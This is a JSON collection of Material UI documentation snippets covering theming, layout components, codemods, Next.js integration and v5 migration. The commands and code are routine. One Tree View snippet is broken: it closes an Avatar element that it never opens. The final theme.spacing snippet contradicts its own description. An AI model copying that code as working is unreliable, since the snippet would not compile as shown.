[
  {
    "owner": "mui",
    "repo": "material-ui",
    "content": "TITLE: Using ThemeProvider with a Custom Theme in React\nDESCRIPTION: This example demonstrates how to create a custom theme using createTheme() and apply it to a React application using ThemeProvider. The custom theme modifies the primary color to use red[500] from the MUI color palette.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/theming/theming.md#2025-04-22_snippet_7\n\nLANGUAGE: jsx\nCODE:\n```\nimport * as React from 'react';\nimport { red } from '@mui/material/colors';\nimport { ThemeProvider, createTheme } from '@mui/material/styles';\n\nconst theme = createTheme({\n  palette: {\n    primary: {\n      main: red[500],\n    },\n  },\n});\n\nfunction App() {\n  return <ThemeProvider theme={theme}>...</ThemeProvider>;\n}\n```\n\n----------------------------------------\n\nTITLE: Importing Basic List Components in React\nDESCRIPTION: Demonstrates how to import the fundamental List and ListItem components from Joy UI. These are the core components needed to create a basic list.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/list/list.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\nimport List from '@mui/joy/List';\nimport ListItem from '@mui/joy/ListItem';\n```\n\n----------------------------------------\n\nTITLE: TypeScript Interface Augmentation for Custom Colors\nDESCRIPTION: Shows how to extend TypeScript interfaces to support custom colors in the palette and component props.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/palette/palette.md#2025-04-22_snippet_4\n\nLANGUAGE: typescript\nCODE:\n```\ndeclare module '@mui/material/styles' {\n  interface Palette {\n    custom: Palette['primary'];\n  }\n\n  interface PaletteOptions {\n    custom?: PaletteOptions['primary'];\n  }\n}\n\ndeclare module '@mui/material/Button' {\n  interface ButtonPropsColorOverrides {\n    custom: true;\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Discrete Slider with Marks in React\nDESCRIPTION: Demonstrates the creation of a discrete slider with value indicators and marks for each step using Material-UI.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/slider/slider.md#2025-04-22_snippet_2\n\nLANGUAGE: JSX\nCODE:\n```\n{\"demo\": \"DiscreteSlider.js\"}\n```\n\n----------------------------------------\n\nTITLE: Running the link-underline-hover codemod for Material-UI v5 migration\nDESCRIPTION: This command runs the link-underline-hover codemod which applies underline='hover' to Link components if no underline prop is defined, maintaining the v4 default behavior.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/migration-v4.md#2025-04-22_snippet_18\n\nLANGUAGE: bash\nCODE:\n```\nnpx @mui/codemod@latest v5.0.0/link-underline-hover <path>\n```\n\n----------------------------------------\n\nTITLE: Autocomplete Import and Props Update\nDESCRIPTION: Shows multiple changes in Autocomplete including import paths and prop updates.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-component-changes.md#2025-04-22_snippet_4\n\nLANGUAGE: diff\nCODE:\n```\n-import Autocomplete from '@mui/lab/Autocomplete';\n-import useAutocomplete  from '@mui/lab/useAutocomplete';\n+import Autocomplete from '@mui/material/Autocomplete';\n+import useAutocomplete from '@mui/material/useAutocomplete';\n```\n\n----------------------------------------\n\nTITLE: Installing Material UI v5 and Styles Package with Yarn\nDESCRIPTION: Command to add the main Material UI v5 package and the styles package using Yarn. This is part of the core migration process.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/migration-v4.md#2025-04-22_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\nyarn add @mui/material @mui/styles\n```\n\n----------------------------------------\n\nTITLE: Basic ButtonGroup Implementation in React\nDESCRIPTION: Demonstrates the basic usage of ButtonGroup component to group related buttons together. Buttons must be immediate children of the ButtonGroup component.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/button-group/button-group.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\n<ButtonGroup variant=\"contained\" aria-label=\"Basic button group\">\n  <Button>One</Button>\n  <Button>Two</Button>\n  <Button>Three</Button>\n</ButtonGroup>\n```\n\n----------------------------------------\n\nTITLE: Implementing Horizontal Linear Stepper in React\nDESCRIPTION: This code demonstrates a horizontal linear stepper implementation. It uses the Stepper, Step, and StepLabel components to create a sequence of steps with labels. The stepper is controlled by the activeStep prop.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/steppers/steppers.md#2025-04-22_snippet_1\n\nLANGUAGE: jsx\nCODE:\n```\n<Stepper activeStep={activeStep}>\n  {steps.map((label, index) => {\n    const stepProps = {};\n    const labelProps = {};\n    if (isStepOptional(index)) {\n      labelProps.optional = (\n        <Typography variant=\"caption\">Optional</Typography>\n      );\n    }\n    if (isStepSkipped(index)) {\n      stepProps.completed = false;\n    }\n    return (\n      <Step key={label} {...stepProps}>\n        <StepLabel {...labelProps}>{label}</StepLabel>\n      </Step>\n    );\n  })}\n</Stepper>\n```\n\n----------------------------------------\n\nTITLE: Adding Custom Typography Variants with TypeScript Support\nDESCRIPTION: Shows how to add new typography variants and disable existing ones, including TypeScript type declarations.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/typography/typography.md#2025-04-22_snippet_5\n\nLANGUAGE: typescript\nCODE:\n```\ndeclare module '@mui/material/styles' {\n  interface TypographyVariants {\n    poster: React.CSSProperties;\n  }\n\n  interface TypographyVariantsOptions {\n    poster?: React.CSSProperties;\n  }\n}\n\ndeclare module '@mui/material/Typography' {\n  interface TypographyPropsVariantOverrides {\n    poster: true;\n    h3: false;\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Customizing Components with Theme Overrides in Joy UI\nDESCRIPTION: Creates a custom theme with component-specific overrides by using the extendTheme function. This example shows how to modify default props and style overrides for the Chip component.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/customization/themed-components/themed-components.md#2025-04-22_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nimport { CssVarsProvider, extendTheme } from '@mui/joy/styles';\n\nconst theme = extendTheme({\n  components: {\n    JoyChip: {\n      defaultProps: {\n        size: 'sm',\n      },\n      styleOverrides: {\n        root: {\n          borderRadius: '4px',\n        },\n      },\n    },\n  },\n});\n\nfunction App() {\n  return <CssVarsProvider theme={theme}>...</CssVarsProvider>;\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Custom Filter Options for MUI Autocomplete\nDESCRIPTION: Shows how to use createFilterOptions to customize the filtering behavior of the Autocomplete component. Demonstrates configuration options for case sensitivity, accent handling, and result limiting.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/autocomplete/autocomplete.md#2025-04-22_snippet_4\n\nLANGUAGE: javascript\nCODE:\n```\nimport { createFilterOptions } from '@mui/material/Autocomplete';\n```\n\n----------------------------------------\n\nTITLE: Migrating JSS with $ Syntax and clsx to TSS-React\nDESCRIPTION: Shows how to transform JSS with $ nesting syntax and clsx class combination to TSS-React. Demonstrates handling nested selectors and class combinations with the cx utility.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/migrating-from-jss.md#2025-04-22_snippet_7\n\nLANGUAGE: diff\nCODE:\n```\n import * as React from 'react';\n-import { makeStyles } from '@material-ui/core/styles';\n-import clsx from 'clsx';\n+import { makeStyles } from 'tss-react/mui';\n\n-const useStyles = makeStyles((theme) => ({\n+const useStyles = makeStyles<void, 'child' | 'small'>()((theme, _params, classes) => ({\n   parent: {\n     padding: 30,\n-    '&:hover $child': {\n+    [`&:hover .${classes.child}`]: {\n       backgroundColor: 'red',\n     },\n   },\n   small: {},\n   child: {\n     backgroundColor: 'blue',\n     height: 50,\n-    '&$small': {\n+    [`&.${classes.small}`]: {\n       backgroundColor: 'lightblue',\n       height: 30\n     }\n   },\n }));\n\n function App() {\n-  const classes = useStyles();\n+  const { classes, cx } = useStyles();\n   return (\n     <div className={classes.parent}>\n       <div className={classes.child}>\n         Background turns red when the mouse hovers over the parent.\n       </div>\n-      <div className={clsx(classes.child, classes.small)}>\n+      <div className={cx(classes.child, classes.small)}>\n         Background turns red when the mouse hovers over the parent.\n         I am smaller than the other child.\n       </div>\n     </div>\n   );\n }\n\n export default App;\n```\n\n----------------------------------------\n\nTITLE: Changing the default font in Joy UI\nDESCRIPTION: Example of how to override the default Inter font in Joy UI theme by configuring the fontFamily property for display and body text.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/customization/theme-typography/theme-typography.md#2025-04-22_snippet_7\n\nLANGUAGE: js\nCODE:\n```\nextendTheme({\n  fontFamily: {\n    display: 'Noto Sans', // applies to `h1`–`h4`\n    body: 'Noto Sans', // applies to `title-*` and `body-*`\n  },\n});\n```\n\n----------------------------------------\n\nTITLE: Installing Material UI with Default Configuration\nDESCRIPTION: Commands to install Material UI with Emotion styling engine using different package managers.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/getting-started/installation/installation.md#2025-04-22_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nnpm install @mui/material @emotion/react @emotion/styled\n```\n\nLANGUAGE: bash\nCODE:\n```\npnpm add @mui/material @emotion/react @emotion/styled\n```\n\nLANGUAGE: bash\nCODE:\n```\nyarn add @mui/material @emotion/react @emotion/styled\n```\n\n----------------------------------------\n\nTITLE: Creating Custom Theme with Color Palette\nDESCRIPTION: Demonstrates creating a custom theme with primary and secondary color palettes using createTheme.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/theming/theming.md#2025-04-22_snippet_4\n\nLANGUAGE: js\nCODE:\n```\nimport { createTheme } from '@mui/material/styles';\nimport { green, purple } from '@mui/material/colors';\n\nconst theme = createTheme({\n  palette: {\n    primary: {\n      main: purple[500],\n    },\n    secondary: {\n      main: green[500],\n    },\n  },\n});\n```\n\n----------------------------------------\n\nTITLE: Configuring Locale Text in Material UI Theme\nDESCRIPTION: This snippet demonstrates how to configure a Chinese (Simplified) locale in a Material UI application by importing the locale from '@mui/material/locale' and applying it to the theme. The configuration is then passed to ThemeProvider to make it globally available.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/guides/localization/localization.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\nimport { createTheme, ThemeProvider } from '@mui/material/styles';\nimport { zhCN } from '@mui/material/locale';\n\nconst theme = createTheme(\n  {\n    palette: {\n      primary: { main: '#1976d2' },\n    },\n  },\n  zhCN,\n);\n\n<ThemeProvider theme={theme}>\n  <App />\n</ThemeProvider>;\n```\n\n----------------------------------------\n\nTITLE: Creating an Auto-layout Grid in React\nDESCRIPTION: This example shows how to create an auto-layout grid where items are given equal space. It demonstrates the use of the size=\"auto\" prop for flexible item sizing.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/grid/grid.md#2025-04-22_snippet_3\n\nLANGUAGE: JSX\nCODE:\n```\n<Grid container spacing={3}>\n  <Grid size=\"auto\">\n    <Item>Variable width content</Item>\n  </Grid>\n  <Grid size={6}>\n    <Item>xs=6</Item>\n  </Grid>\n  <Grid size=\"auto\">\n    <Item>Variable width content</Item>\n  </Grid>\n</Grid>\n```\n\n----------------------------------------\n\nTITLE: Theme Composition with Dependencies\nDESCRIPTION: Shows how to create a theme in multiple steps when theme options depend on other theme values.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/theming/theming.md#2025-04-22_snippet_5\n\nLANGUAGE: js\nCODE:\n```\nimport { createTheme } from '@mui/material/styles';\n\nlet theme = createTheme({\n  palette: {\n    primary: {\n      main: '#0052cc',\n    },\n    secondary: {\n      main: '#edf2ff',\n    },\n  },\n});\n\ntheme = createTheme(theme, {\n  palette: {\n    info: {\n      main: theme.palette.secondary.main,\n    },\n  },\n});\n```\n\n----------------------------------------\n\nTITLE: Implementing Responsive Grid Layout with Multiple Breakpoints\nDESCRIPTION: This example shows how to create a responsive grid layout using multiple breakpoints. It demonstrates how to set different column widths for various screen sizes using object notation.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/grid/grid.md#2025-04-22_snippet_1\n\nLANGUAGE: JSX\nCODE:\n```\n<Grid container spacing={2}>\n  <Grid size={{ xs: 12, sm: 6 }}>\n    <Item>xs=12 sm=6</Item>\n  </Grid>\n  <Grid size={{ xs: 12, sm: 6 }}>\n    <Item>xs=12 sm=6</Item>\n  </Grid>\n  <Grid size={{ xs: 12, sm: 6 }}>\n    <Item>xs=12 sm=6</Item>\n  </Grid>\n  <Grid size={{ xs: 12, sm: 6 }}>\n    <Item>xs=12 sm=6</Item>\n  </Grid>\n</Grid>\n```\n\n----------------------------------------\n\nTITLE: Implementing Responsive Styles with Material UI Breakpoints\nDESCRIPTION: Example showing how to use Material UI breakpoints to change background colors based on screen width using theme.breakpoints.up/down methods.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/breakpoints/breakpoints.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\nconst styles = (theme) => ({\n  root: {\n    padding: theme.spacing(1),\n    [theme.breakpoints.down('md')]: {\n      backgroundColor: theme.palette.secondary.main,\n    },\n    [theme.breakpoints.up('md')]: {\n      backgroundColor: theme.palette.primary.main,\n    },\n    [theme.breakpoints.up('lg')]: {\n      backgroundColor: green[500],\n    },\n  },\n});\n```\n\n----------------------------------------\n\nTITLE: Installing Material UI with Styled-Components\nDESCRIPTION: Commands to install Material UI with styled-components styling engine using different package managers.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/getting-started/installation/installation.md#2025-04-22_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\nnpm install @mui/material @mui/styled-engine-sc styled-components\n```\n\nLANGUAGE: bash\nCODE:\n```\npnpm add @mui/material @mui/styled-engine-sc styled-components\n```\n\nLANGUAGE: bash\nCODE:\n```\nyarn add @mui/material @mui/styled-engine-sc styled-components\n```\n\n----------------------------------------\n\nTITLE: Importing and Rendering Material UI Button Component in JavaScript\nDESCRIPTION: This snippet demonstrates how to import and use a Material UI Button component. It shows a basic example of rendering a button with customizable properties like 'variant'.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/getting-started/usage/usage.md#2025-04-22_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\n{\"demo\": \"ButtonUsage.js\", \"defaultCodeOpen\": true}\n```\n\n----------------------------------------\n\nTITLE: Configuring _app.tsx for Material UI with Next.js Pages Router\nDESCRIPTION: Diff showing how to modify the _app.tsx file to integrate AppCacheProvider for Material UI with Next.js Pages Router.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/integrations/nextjs/nextjs.md#2025-04-22_snippet_12\n\nLANGUAGE: diff\nCODE:\n```\n+import { AppCacheProvider } from '@mui/material-nextjs/v15-pagesRouter';\n // Or `v1X-pages` if you are using Next.js v1X\n\n export default function MyApp(props) {\n   return (\n+    <AppCacheProvider {...props}>\n       <Head>\n         ...\n       </Head>\n       ...\n+    </AppCacheProvider>\n   );\n }\n```\n\n----------------------------------------\n\nTITLE: Basic Media Query Implementation\nDESCRIPTION: Shows the basic implementation of useMediaQuery hook for responsive design in React components.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/use-media-query/use-media-query.md#2025-04-22_snippet_3\n\nLANGUAGE: jsx\nCODE:\n```\nimport * as React from 'react';\nimport useMediaQuery from '@mui/material/useMediaQuery';\n\nexport default function SimpleMediaQuery() {\n  const matches = useMediaQuery('(min-width:600px)');\n\n  return <span>{`(min-width:600px) matches: ${matches}`}</span>;\n}\n```\n\n----------------------------------------\n\nTITLE: Custom Named Breakpoints Configuration\nDESCRIPTION: Example showing how to define custom breakpoint names with corresponding width values.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/breakpoints/breakpoints.md#2025-04-22_snippet_2\n\nLANGUAGE: js\nCODE:\n```\nconst theme = createTheme({\n  breakpoints: {\n    values: {\n      mobile: 0,\n      tablet: 640,\n      laptop: 1024,\n      desktop: 1200,\n    },\n  },\n});\n```\n\n----------------------------------------\n\nTITLE: Material-UI Types Codemod Example\nDESCRIPTION: This codemod renames the Omit import from @material-ui/types to DistributiveOmit to match API changes in Material-UI v5.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_95\n\nLANGUAGE: diff\nCODE:\n```\n-import { Omit } from '@material-ui/types';\n+import { DistributiveOmit } from '@material-ui/types';\n```\n\n----------------------------------------\n\nTITLE: Creating a Basic Grid Layout in React\nDESCRIPTION: This snippet demonstrates how to create a basic grid layout using the Grid component. It shows the usage of the container prop and setting column widths using the size prop.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/grid/grid.md#2025-04-22_snippet_0\n\nLANGUAGE: JSX\nCODE:\n```\n<Grid container spacing={2}>\n  <Grid size={6}>\n    <Item>xs=6</Item>\n  </Grid>\n  <Grid size={6}>\n    <Item>xs=6</Item>\n  </Grid>\n  <Grid size={6}>\n    <Item>xs=6</Item>\n  </Grid>\n  <Grid size={6}>\n    <Item>xs=6</Item>\n  </Grid>\n</Grid>\n```\n\n----------------------------------------\n\nTITLE: Rendering a Basic Material UI Button Component in React\nDESCRIPTION: This snippet demonstrates how to use the Material UI Button component in a React application. It showcases the basic usage and mentions the ability to change the variant prop to alter the button's style.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/getting-started/learn/learn.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\n{\"demo\": \"../usage/ButtonUsage.js\", \"defaultCodeOpen\": true}\n```\n\n----------------------------------------\n\nTITLE: Implementing Simple Badge in React Material-UI\nDESCRIPTION: Demonstrates basic usage of the Badge component with text content using primary and secondary colors.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/badges/badges.md#2025-04-22_snippet_0\n\nLANGUAGE: JSX\nCODE:\n```\nSimpleBadge.js\n```\n\n----------------------------------------\n\nTITLE: Creating Customized Checkboxes in React\nDESCRIPTION: Shows an example of customizing the Checkbox component in Material-UI.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/checkboxes/checkboxes.md#2025-04-22_snippet_9\n\nLANGUAGE: JSX\nCODE:\n```\n{\"demo\": \"CustomizedCheckbox.js\"}\n```\n\n----------------------------------------\n\nTITLE: Renaming ExpansionPanel to Accordion in React\nDESCRIPTION: Renames 'ExpansionPanel*' components to 'Accordion*'. This codemod updates the component names to reflect the new naming convention in Material-UI v5.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_82\n\nLANGUAGE: bash\nCODE:\n```\nnpx @mui/codemod@latest v5.0.0/expansion-panel-component <path>\n```\n\n----------------------------------------\n\nTITLE: Creating a Custom Tree Item with useTreeItem2 Hook in MUI Tree View (JSX)\nDESCRIPTION: This React code defines a custom tree item component utilizing the new useTreeItem2 hook for full control over Tree View item rendering, behaviors, and subcomponent customization. It leverages destructuring of props and hooks for roots, labels, icons, and group transitions, demonstrating how to orchestrate flexible tree views. Required dependencies include React, MUI's Tree View components (TreeItem2, TreeItem2Provider, etc.), and the useTreeItem2 hook. The component expects typical tree item props and outputs a fully composable tree item for use as a RichTreeView slot.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/mui-x-v7.md#2025-04-22_snippet_2\n\nLANGUAGE: JSX\nCODE:\n```\nconst CustomTreeItem = React.forwardRef(function CustomTreeItem(\n  props: TreeItem2Props,\n  ref: React.Ref<HTMLLIElement>,\n) {\n  const { id, nodeId, label, disabled, children, ...other } = props;\n\n  const {\n    getRootProps,\n    getContentProps,\n    getIconContainerProps,\n    getLabelProps,\n    getGroupTransitionProps,\n    status,\n  } = useTreeItem2({ id, nodeId, children, label, disabled, rootRef: ref });\n\n  // Compose and implement your tree item as you need\n  return (\n    <TreeItem2Provider nodeId={nodeId}>\n      <TreeItem2Root {...getRootProps(other)}>\n        <TreeItemContent {...getContentProps()}>\n          <TreeItem2IconContainer {...getIconContainerProps()}>\n            <TreeItem2Icon status={status} />\n          </TreeItem2IconContainer>\n          <Box sx={{ flexGrow: 1, display: 'flex', gap: 1 }}>\n              {(label as string)[0]}\n            </Avatar>\n            <TreeItem2Label {...getLabelProps()} />\n          </Box>\n        </TreeItemContent>\n        {children && <TreeItem2GroupTransition {...getGroupTransitionProps()} />}\n      </TreeItem2Root>\n    </TreeItem2Provider>\n  );\n});\n```\n\n----------------------------------------\n\nTITLE: Implementing Server-Side Rendering with styled-components and JSS\nDESCRIPTION: Example of implementing getInitialProps for server-side rendering of styles using both styled-components and JSS. The code demonstrates plugin configuration for style collection and injection.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/integrations/nextjs/nextjs.md#2025-04-22_snippet_16\n\nLANGUAGE: javascript\nCODE:\n```\nimport { ServerStyleSheet } from 'styled-components';\n\nMyDocument.getInitialProps = async (ctx) => {\n  const jssSheets = new JSSServerStyleSheets();\n  const styledComponentsSheet = new ServerStyleSheet();\n\n  try {\n    const finalProps = await documentGetInitialProps(ctx, {\n      emotionCache: createEmotionCache(),\n      plugins: [\n        {\n          // styled-components\n          enhanceApp: (App) => (props) =>\n            styledComponentsSheet.collectStyles(<App {...props} />),\n          resolveProps: async (initialProps) => ({\n            ...initialProps,\n            styles: [\n              styledComponentsSheet.getStyleElement(),\n              ...initialProps.styles,\n            ],\n          }),\n        },\n        {\n          // JSS\n          enhanceApp: (App) => (props) => jssSheets.collect(<App {...props} />),\n          resolveProps: async (initialProps) => {\n            const css = jssSheets.toString();\n            return {\n              ...initialProps,\n              styles: [\n                ...initialProps.styles,\n                <style\n                  id=\"jss-server-side\"\n                  key=\"jss-server-side\"\n                  // eslint-disable-next-line react/no-danger\n                  dangerouslySetInnerHTML={{ __html: css }}\n                />,\n                <style id=\"insertion-point-jss\" key=\"insertion-point-jss\" />,\n              ],\n            };\n          },\n        },\n      ],\n    });\n    return finalProps;\n  } finally {\n    styledComponentsSheet.seal();\n  }\n};\n```\n\n----------------------------------------\n\nTITLE: Table Props Codemod Example\nDESCRIPTION: This codemod renames props in Table-related components to match the updated API in Material-UI v5, including event handlers and class names changes.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_110\n\nLANGUAGE: diff\nCODE:\n```\n-<>\n-  <TablePagination onChangeRowsPerPage={() => {}} onChangePage={() => {}} />\n-  <TablePagination classes={{ input: 'foo' }} />\n-  <Table padding=\"default\" />\n-  <TableCell padding=\"default\" />\n-</>\n+<>\n+  <TablePagination onRowsPerPageChange={() => {}} onPageChange={() => {}} />\n+  <TablePagination classes={{ select: 'foo' }} />\n+  <Table padding=\"normal\" />\n+  <TableCell padding=\"normal\" />\n+</>\n```\n\n----------------------------------------\n\nTITLE: Configuring TypeScript for Material UI Projects\nDESCRIPTION: Recommended TypeScript configuration options in tsconfig.json for Material UI projects. These settings enable strict type checking and include necessary library definitions for proper type functionality.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/guides/typescript/typescript.md#2025-04-22_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"compilerOptions\": {\n    \"lib\": [\"es6\", \"dom\"],\n    \"noImplicitAny\": true,\n    \"noImplicitThis\": true,\n    \"strictNullChecks\": true,\n    \"allowSyntheticDefaultImports\": true\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Fixed App Bar with Toolbar\nDESCRIPTION: Shows how to implement a fixed App Bar with a secondary Toolbar to prevent content overlap.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/app-bar/app-bar.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\nfunction App() {\n  return (\n    <React.Fragment>\n      <AppBar position=\"fixed\">\n        <Toolbar>{/* content */}</Toolbar>\n      </AppBar>\n      <Toolbar />\n    </React.Fragment>\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Range Slider in React\nDESCRIPTION: Demonstrates the creation of a range slider by supplying an array of values to the 'value' prop in Material-UI.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/slider/slider.md#2025-04-22_snippet_7\n\nLANGUAGE: JSX\nCODE:\n```\n{\"demo\": \"RangeSlider.js\"}\n```\n\n----------------------------------------\n\nTITLE: Integrating Material UI Theme and Font Optimization in Next.js App Router\nDESCRIPTION: Diff showing how to implement font optimization with Roboto font and Material UI ThemeProvider in the Next.js App Router layout.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/integrations/nextjs/nextjs.md#2025-04-22_snippet_5\n\nLANGUAGE: diff\nCODE:\n```\n import { AppRouterCacheProvider } from '@mui/material-nextjs/v15-appRouter';\n+import { Roboto } from 'next/font/google';\n+import { ThemeProvider } from '@mui/material/styles';\n+import theme from '../theme';\n\n+const roboto = Roboto({\n+  weight: ['300', '400', '500', '700'],\n+  subsets: ['latin'],\n+  display: 'swap',\n+  variable: '--font-roboto',\n+});\n\n export default function RootLayout(props) {\n   const { children } = props;\n   return (\n+    <html lang=\"en\" className={roboto.variable}>\n       <body>\n          <AppRouterCacheProvider>\n+           <ThemeProvider theme={theme}>\n              {children}\n+           </ThemeProvider>\n          </AppRouterCacheProvider>\n       </body>\n     </html>\n   );\n }\n```\n\n----------------------------------------\n\nTITLE: Accessing Theme in React Components\nDESCRIPTION: Shows how to access theme variables in functional React components using the useTheme hook.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/theming/theming.md#2025-04-22_snippet_2\n\nLANGUAGE: jsx\nCODE:\n```\nimport { useTheme } from '@mui/material/styles';\n\nfunction DeepChild() {\n  const theme = useTheme();\n  return <span>{`spacing ${theme.spacing}`}</span>;\n}\n```\n\n----------------------------------------\n\nTITLE: Customizing Grid Breakpoints in React\nDESCRIPTION: This example shows how to use custom breakpoints with the Grid component. It demonstrates setting up custom breakpoint names and using them in responsive layouts.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/grid/grid.md#2025-04-22_snippet_5\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport { ThemeProvider, createTheme } from '@mui/material/styles';\n\nfunction Demo() {\n  return (\n    <ThemeProvider\n      theme={createTheme({\n        breakpoints: {\n          values: {\n            laptop: 1024,\n            tablet: 640,\n            mobile: 0,\n            desktop: 1280,\n          },\n        },\n      })}\n    >\n      <Grid container spacing={{ mobile: 1, tablet: 2, laptop: 3 }}>\n        {Array.from(Array(4)).map((_, index) => (\n          <Grid key={index} size={{ mobile: 6, tablet: 4, laptop: 3 }}>\n            <div>{index + 1}</div>\n          </Grid>\n        ))}\n      </Grid>\n    </ThemeProvider>\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Positioned Menu Implementation\nDESCRIPTION: Menu positioning using Popover component with custom anchor positioning.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/menus/menus.md#2025-04-22_snippet_4\n\nLANGUAGE: JSX\nCODE:\n```\n{\"demo\": \"PositionedMenu.js\"}\n```\n\n----------------------------------------\n\nTITLE: Basic Codemod Usage - Bash Commands\nDESCRIPTION: Shows the basic command structure and options for running MUI codemods using npx. Includes options for dry runs, parser selection, and jscodeshift configuration.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nnpx @mui/codemod <codemod> <paths...>\n\nApplies a `@mui/codemod` to the specified paths\n\nPositionals:\n  codemod  The name of the codemod                                [string]\n  paths    Paths forwarded to `jscodeshift`                       [string]\n\nOptions:\n  --version  Show version number                                 [boolean]\n  --help     Show help                                           [boolean]\n  --dry      dry run (no changes are made to files)\n                                                [boolean] [default: false]\n  --parser   which parser for jscodeshift to use.\n                                                [string] [default: 'tsx']\n  --print    print transformed files to stdout, useful for development\n                                                [boolean] [default: false]\n  --jscodeshift                                  [string] [default: false]\n```\n\n----------------------------------------\n\nTITLE: Installing and Running the Material UI CRA Example\nDESCRIPTION: These commands install the required dependencies and start the development server for the Material UI Create React App example. It uses npm for package management.\nSOURCE: https://github.com/mui/material-ui/blob/master/examples/material-ui-cra/README.md#2025-04-22_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nnpm install\nnpm start\n```\n\n----------------------------------------\n\nTITLE: Using Joy UI Components in Next.js Server Components\nDESCRIPTION: This example shows how to use Joy UI components in a Next.js server component (page.tsx) without any additional directives. It demonstrates the proper way to use Joy UI components in a server-rendered context.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/integrations/next-js-app-router/next-js-app-router.md#2025-04-22_snippet_1\n\nLANGUAGE: tsx\nCODE:\n```\n// app/page.tsx\nimport Sheet from '@mui/joy/Sheet';\nimport Typography from '@mui/joy/Typography';\n\nexport default function Page() {\n  return (\n    <Sheet>\n      <Typography fontSize=\"sm\">Hello World</Typography>\n    </Sheet>\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Responsive Full-Screen Dialog in React\nDESCRIPTION: Example of creating a responsive full-screen dialog using useMediaQuery hook from Material-UI.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/dialogs/dialogs.md#2025-04-22_snippet_1\n\nLANGUAGE: jsx\nCODE:\n```\nimport useMediaQuery from '@mui/material/useMediaQuery';\n\nfunction MyComponent() {\n  const theme = useTheme();\n  const fullScreen = useMediaQuery(theme.breakpoints.down('md'));\n\n  return <Dialog fullScreen={fullScreen} />;\n}\n```\n\n----------------------------------------\n\nTITLE: Change in theme.spacing Return Value Format\nDESCRIPTION: Example showing how theme.spacing now returns pixel values with px suffix by default, improving integration with styled-components and Emotion.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-style-changes.md#2025-04-22_snippet_12\n\nLANGUAGE: javascript\nCODE:\n```\ntheme.spacing(2) => 16\n```\n\nLANGUAGE: 